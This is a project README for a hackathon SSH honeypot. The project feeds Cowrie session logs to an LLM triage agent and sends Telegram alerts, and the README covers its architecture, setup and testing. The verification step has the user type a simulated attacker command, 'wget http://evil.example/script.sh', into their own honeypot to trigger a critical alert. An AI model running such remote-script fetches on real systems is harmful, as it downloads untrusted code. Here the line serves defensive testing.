# Honai

AI honeypot with agentic SOC analysis. A Cowrie SSH honeypot captures real
attacker sessions on port 22, an LLM agent triages each session and assigns a
verdict, and Telegram fires urgent alerts on suspicious or critical activity
plus a digest you can run on a cadence.

Built in 24 hours for a hackathon.

## Architecture

```
       internet
          │
          ▼  port 22
┌──────────────────┐
│ Cowrie (Docker)  │   anywhere with port 22 exposed (VPS or laptop+forward)
└────────┬─────────┘
         │ cowrie.json (bind-mounted)
         ▼
┌──────────────────┐
│ ingest/tail.py   │   parses session-end events, dedups by payload_hash
└────────┬─────────┘
         │ INSERT
         ▼
┌──────────────────┐
│   sessions.db    │   SQLite — the contract surface (see docs/SCHEMA.md)
└────┬─────────────┘
     │
     │ SELECT WHERE status='new'
     ▼
┌──────────────────┐
│ agents/triage.py │   Groq/Llama verdict → UPDATE row, status='triaged'
└────────┬─────────┘
         │ inline call when verdict ∈ {suspicious, critical}
         ▼
┌──────────────────┐
│ agents/notify.py │   Telegram, deduped via alerts ledger
└──────────────────┘

agents/digest.py   periodic Markdown digest → digests table + Telegram
```

The two halves communicate only through `sessions.db`. See
[docs/SCHEMA.md](docs/SCHEMA.md) for table definitions, status lifecycle, and
which side writes which fields.

## Layout

| Path           | Owner   | Purpose                                                  |
| -------------- | ------- | -------------------------------------------------------- |
| `honeypot/`    | Charlie | Cowrie `docker-compose.yml` + runtime data (gitignored)  |
| `ingest/`      | Charlie | Python tailer that turns `cowrie.json` into DB rows      |
| `db/`          | Charlie | Schema (`init.sql`) — applied automatically by tailer    |
| `agents/`      | Garv    | AI triage, Telegram alerts, periodic digest             |
| `docs/`        | shared  | `SCHEMA.md` — DB contract between halves                 |

## Running it locally

### Prerequisites

- **Docker Desktop** (running)
- **Python 3.10+**
- **Groq API key** — free tier at https://console.groq.com
- **Telegram bot** — create via [@BotFather](https://t.me/BotFather); get your
  chat ID by messaging [@userinfobot](https://t.me/userinfobot)

### One-time setup

```bash
git clone <this repo>
cd Honai

# Agent deps
pip install -r agents/requirements.txt

# Fill in credentials
cp agents/.env.example agents/.env
# Edit agents/.env:
#   DB_PATH=../sessions.db          (local-dev value; agents run from agents/)
#   GROQ_API_KEY=gsk_...
#   TELEGRAM_TOKEN=...
#   TELEGRAM_CHAT_ID=...
```

### Run it (three terminals)

**Terminal 1 — honeypot:**

```bash
cd honeypot
mkdir -p var/log/cowrie var/lib/cowrie/downloads var/lib/cowrie/tty
docker compose up -d
docker compose logs -f cowrie    # optional: watch attacks land
```

**Terminal 2 — tailer (follow mode):**

```bash
python -m ingest.tail --cowrie-log honeypot/var/log/cowrie/cowrie.json
```

**Terminal 3 — triage agent:**

```bash
cd agents
python triage.py
```

### Verify end-to-end

From a fourth terminal:

```bash
ssh root@localhost     # password: anything (Cowrie accepts random passwords)
> whoami
> wget http://evil.example/script.sh
> exit
```

Within ~10 seconds you should see in Terminal 3:

```
[triage] session N (172.18.0.1) → critical
```

…and your phone should buzz with a Telegram alert.

### Periodic digest (optional)

```bash
cd agents
python digest.py
```

One-shot: reads triaged sessions since the last digest, asks Groq for a 3-paragraph
summary, writes a row to `digests`, pushes to Telegram. Re-run on a cadence
(cron / Task Scheduler / a simple loop) for live demo digests.

### Tear down

```bash
# Ctrl+C the Python processes
cd honeypot && docker compose down
```

## Going public

For attackers to actually find the honeypot you need port 22 reachable from the
public internet. Options:

- **Router port-forward**: forward external TCP 22 → your laptop's LAN IP. Real
  IP, real scanners. Requires admin access to your router; some ISPs block 22.
- **VPS** (Hetzner, DigitalOcean, etc.): cleaner separation, always-on. Move
  the real sshd off 22 first — see comments at the top of
  [honeypot/docker-compose.yml](honeypot/docker-compose.yml) for the checklist.
- **ngrok TCP**: `ngrok tcp 22` exposes the laptop publicly without router
  config. Works for judges; won't get organic scanner traffic since attackers
  don't browse ngrok domains.

## Testing without Cowrie

A sample log lives at [ingest/fixtures/sample_cowrie.json](ingest/fixtures/sample_cowrie.json).
Three sessions: a credential-stuffer, a malware downloader, and a duplicate of
the downloader from a different IP (exercises payload-hash dedup).

```bash
python -m ingest.tail --cowrie-log ingest/fixtures/sample_cowrie.json --once
```

Expected: `+2 inserted, +1 deduped`.

## Working agreement

- Small commits, one logical step per commit.
- Don't modify code outside your half. Schema changes go through
  [docs/SCHEMA.md](docs/SCHEMA.md) and need both teammates to agree.
- VPS-level changes (firewall, ports, systemd) get explicitly called out
  before running.

## License

MIT — see [LICENSE](LICENSE).
